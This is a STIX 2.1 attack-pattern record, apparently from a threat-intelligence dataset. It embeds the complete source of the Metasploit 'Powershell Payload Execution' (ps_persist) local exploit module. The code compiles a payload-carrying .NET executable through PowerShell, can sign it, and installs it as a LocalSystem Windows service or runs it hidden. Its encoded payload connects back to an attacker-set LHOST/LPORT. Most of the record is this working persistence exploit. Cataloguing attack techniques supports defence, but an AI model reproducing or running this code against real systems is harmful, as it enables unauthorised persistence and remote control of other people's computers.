{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--966ae562-ab3b-456a-a1f7-2b6c809e5bea",
    "created": "2024-08-14T16:49:58.933857Z",
    "modified": "2024-08-14T16:49:58.933861Z",
    "name": "\"Powershell Payload Execution\"",
    "description": " This module generates a dynamic executable on the session host using .NET templates. Code is pulled from C# templates and impregnated with a payload before being sent to a modified PowerShell session with .NET 4 loaded. The compiler builds the executable (standard or Windows service) in memory and produces a binary which can be started/installed and downloaded for later use. After compilation the PoweShell session can also sign the executable if provided a path the a .pfx formatted certificate.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/ps_persist.rb",
            "external_id": "ps_persist.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::Windows::Services\n  include Msf::Post::Windows::Powershell\n  include Msf::Post::Windows::Powershell::DotNet\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => \"Powershell Payload Execution\",\n        'Description' => %q{\n          This module generates a dynamic executable on the session host using .NET templates.\n          Code is pulled from C# templates and impregnated with a payload before being\n          sent to a modified PowerShell session with .NET 4 loaded. The compiler builds\n          the executable (standard or Windows service) in memory and produces a binary\n          which can be started/installed and downloaded for later use. After compilation the\n          PoweShell session can also sign the executable if provided a path the a .pfx formatted\n          certificate.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'RageLtMan <rageltman[at]sempervictus>', # Module, libs, and powershell-fu\n          'Matt \"hostess\" Andreko' # .NET harness, and requested modifications\n        ],\n\n        'Payload' => {\n          'EncoderType' => Msf::Encoder::Type::AlphanumMixed,\n          'EncoderOptions' =>\n              {\n                'BufferRegister' => 'EAX',\n              },\n        },\n        'Platform' => [ 'windows' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Targets' => [ [ 'Universal', {} ] ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2012-08-14',\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n              stdapi_fs_stat\n              stdapi_sys_config_getenv\n              stdapi_sys_config_getsid\n              stdapi_sys_process_execute\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptBool.new('SVC_GEN', [false, 'Build a Windows service, which defaults to running as localsystem', false ]),\n        OptString.new('SVC_NAME', [false, 'Name to use for the Windows Service', 'MsfDynSvc']),\n        OptString.new('SVC_DNAME', [false, 'Display Name to use for the Windows Service', 'MsfDynSvc']),\n        OptBool.new('START_APP', [false, 'Run EXE/Install Service', true ]),\n        OptString.new('OUTPUT_TARGET', [false, 'Name and path of the generated executable, default random, omit extension' ]),\n\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptString.new('CERT_PATH', [false, 'Path on host to .pfx fomatted certificate for signing' ]),\n        OptBool.new('SVC_REMOVE', [false, 'Remove Windows service named SVC_NAME']),\n        OptBool.new('BypassUAC', [false, 'Enter credentials to execute envoker in .NET', false]),\n        OptString.new('USERNAME', [false, 'Windows username']),\n        OptString.new('PASSWORD', [false, 'Windows user password - cleartext']),\n        OptString.new('DOMAIN', [false, 'Windows domain or workstation name']),\n\n      ]\n    )\n  end\n\n  def exploit\n    # Make sure we meet the requirements before running the script\n    if !(session.type == \"meterpreter\" || have_powershell?)\n      print_error(\"Incompatible Environment\")\n      return\n    end\n    # Havent figured this one out yet, but we need a PID owned by a user, cant steal tokens either\n    if client.sys.config.is_system?\n      print_error(\"Cannot run as system\")\n      return\n    end\n\n    # End of file marker\n    eof = Rex::Text.rand_text_alpha(8)\n    env_suffix = Rex::Text.rand_text_alpha(8)\n\n    com_opts = {}\n    com_opts[:net_clr] = 4.0 # Min .NET runtime to load into a PS session\n    com_opts[:target] = datastore['OUTPUT_TARGET'] || session.sys.config.getenv('TEMP') + \"\\\\#{Rex::Text.rand_text_alpha(rand(8) + 8)}.exe\"\n    com_opts[:payload] = payload_script # payload.encoded\n    vprint_good com_opts[:payload].length.to_s\n\n    if datastore['SVC_GEN']\n      com_opts[:harness] = File.join(Msf::Config.install_root, 'external', 'source', 'psh_exe', 'dot_net_service.cs')\n      com_opts[:assemblies] = ['System.ServiceProcess.dll', 'System.Configuration.Install.dll']\n    else\n      com_opts[:harness] = File.join(Msf::Config.install_root, 'external', 'source', 'psh_exe', 'dot_net_exe.cs')\n    end\n\n    com_opts[:cert] = datastore['CERT_PATH']\n\n    if datastore['SVC_REMOVE']\n      remove_dyn_service(com_opts[:target])\n      return\n    end\n    vprint_good(\"Writing to #{com_opts[:target]}\")\n\n    com_script = dot_net_compiler(com_opts)\n    ps_out = psh_exec(com_script)\n\n    if datastore['Powershell::Post::dry_run']\n      print_good com_script\n      print_error ps_out\n      return\n    end\n    # Check for result\n    begin\n      size = session.fs.file.stat(com_opts[:target].gsub('\\\\', '\\\\\\\\')).size\n      vprint_good(\"File #{com_opts[:target].gsub('\\\\', '\\\\\\\\')} found, #{size}kb\")\n    rescue\n      print_error(\"File #{com_opts[:target].gsub('\\\\', '\\\\\\\\')} not found\")\n      return\n    end\n\n    # Run the harness\n    if datastore['START_APP']\n      if datastore['SVC_GEN']\n        service_create(datastore['SVC_NAME'], datastore['SVC_DNAME'], com_opts[:target].gsub('\\\\', '\\\\\\\\'), startup = 2, server = nil)\n        if service_start(datastore['SVC_NAME']).to_i == 0\n          vprint_good(\"Service Started\")\n        end\n      else\n        session.sys.process.execute(com_opts[:target].gsub('\\\\', '\\\\\\\\'), nil, { 'Hidden' => true, 'Channelized' => true })\n      end\n    end\n\n    print_good('Finished!')\n  end\n\n  # This should be handled by the exploit mixin, right?\n  def payload_script\n    pay_mod = framework.payloads.create(datastore['PAYLOAD'])\n    payload = pay_mod.generate_simple(\n      \"BadChars\" => '',\n      \"Format\" => 'raw',\n      \"Encoder\" => 'x86/alpha_mixed',\n      \"ForceEncode\" => true,\n      \"Options\" =>\n       {\n         'LHOST' => datastore['LHOST'],\n         'LPORT' => datastore['LPORT'],\n         'EXITFUNC' => 'thread',\n         'BufferRegister' => 'EAX'\n       },\n    )\n\n    # To ensure compatibility out payload should be US-ASCII\n    return payload.encode('ASCII')\n  end\n\n  # Local service functionality should probably be replaced with upstream Post\n  def remove_dyn_service(file_path)\n    service_stop(datastore['SVC_NAME'])\n    if service_delete(datastore['SVC_NAME'])['GetLastError'] == 0\n      vprint_good(\"Service #{datastore['SVC_NAME']} Removed, deleting #{file_path.gsub('\\\\', '\\\\\\\\')}\")\n      session.fs.file.rm(file_path.gsub('\\\\', '\\\\\\\\'))\n    else\n      print_error(\"Something went wrong, not deleting #{file_path.gsub('\\\\', '\\\\\\\\')}\")\n    end\n    return\n  end\n\n  def install_dyn_service(file_path)\n    service_create(datastore['SVC_NAME'], datastore['SVC_DNAME'], file_path.gsub('\\\\', '\\\\\\\\'), startup = 2, server = nil)\n    if service_start(datastore['SVC_NAME']).to_i == 0\n      vprint_good(\"Service Binary #{file_path} Started\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-08-14",
    "x_mitre_platforms": [
        "[ 'windows' ]"
    ]
}